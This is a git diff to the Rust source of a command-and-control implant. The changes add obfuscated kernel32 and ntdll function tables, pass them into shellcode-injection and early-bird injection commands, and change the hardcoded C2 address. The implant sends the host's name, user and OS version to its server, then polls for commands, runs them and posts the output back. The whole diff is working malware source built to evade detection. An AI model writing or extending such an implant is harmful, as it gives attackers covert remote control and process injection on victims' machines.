@@ -4,6 +4,8 @@ use reqwest::blocking::ClientBuilder;
 
 use litcrypt::{lc, use_litcrypt};
 use_litcrypt!();
+use crate::obfwin::Constants::*;
+use crate::obfwin::Functions::*;
 
 mod commands;
 mod obfwin;
@@ -83,6 +85,8 @@ fn process_command(
     cmd_str: &String,
     base_url: &str,
     cookie_header: &reqwest::header::HeaderValue,
+    kernel32: &obf_kernel32,
+    ntdll: &obf_ntdll
 ) -> String {
     // get the commands out into a vector
     let cmd_vec = cmd_str.split(":::").collect::<Vec<_>>();
@@ -103,6 +107,8 @@ fn process_command(
                 cookie_header,
                 file_name,
                 mem_perms,
+                kernel32,
+                ntdll
             );
         }
         "CMD_SHELLCODE_INJECT" => {
@@ -115,6 +121,8 @@ fn process_command(
                 file_name,
                 pid,
                 mem_perms,
+                kernel32,
+                ntdll
             );
         }
         "CMD_SHELLCODE_EARLYBIRD" => {
@@ -125,6 +133,8 @@ fn process_command(
                 cookie_header,
                 file_name,
                 mem_perms,
+                kernel32,
+                ntdll
             );
         }
         "CMD_KILL" => {
@@ -171,27 +181,33 @@ fn send_response(
         .unwrap();
 
     // Check to see if the command was a CMD_KILL, if so, exit out of the process
-    if cmd_vec[1] == lc!("CMD_KILL") {
+    if cmd_vec[1] == "CMD_KILL" {
         std::process::exit(0);
     }
 }
 
-fn main() {
+fn main(argc: i32, argv: *const *const u8) -> i32 {
+
+    // println!("THIS IS HERE");
+
     let hostname = whoami::hostname();
     let username = whoami::username();
     let info = os_info::get();
     let version: String = format!("{}", info.version());
+
+    let OBF_KERNEL32: obf_kernel32 = initialize_obf_kernel32();
+    let OBF_NTDLL: obf_ntdll = initialize_obf_ntdll();
 
     let versions = version.split('.').collect::<Vec<_>>();
 
     let major_v = versions.first().unwrap();
     let minor_v = versions.last().unwrap();
 
-    let base_url = lc!("https://192.168.4.54");
+    let base_url = "https://192.168.2.165";
 
     let resp = login(&*base_url, &*hostname, &*username, &*major_v, &*minor_v).unwrap();
 
-    let implant_id = resp.headers().get(lc!("cookie")).unwrap().to_str().unwrap();
+    let implant_id = resp.headers().get("cookie").unwrap().to_str().unwrap();
 
     let cookie_header = reqwest::header::HeaderValue::from_str(implant_id).unwrap();
 
@@ -201,11 +217,13 @@ fn main() {
         let cmd_str = request_command(&*base_url, &cookie_header);
 
         // Run the command and catch output
-        let cmd_output = process_command(&cmd_str, &base_url, &cookie_header);
+        let cmd_output = process_command(&cmd_str, &base_url, &cookie_header, &OBF_KERNEL32, &OBF_NTDLL);
 
         // Send output back to C2 server
         send_response(&*base_url, &cookie_header, &cmd_output, &cmd_str);
 
         std::thread::sleep(std::time::Duration::from_secs(SLEEP_TIME))
     }
+
+    return 0;
 }
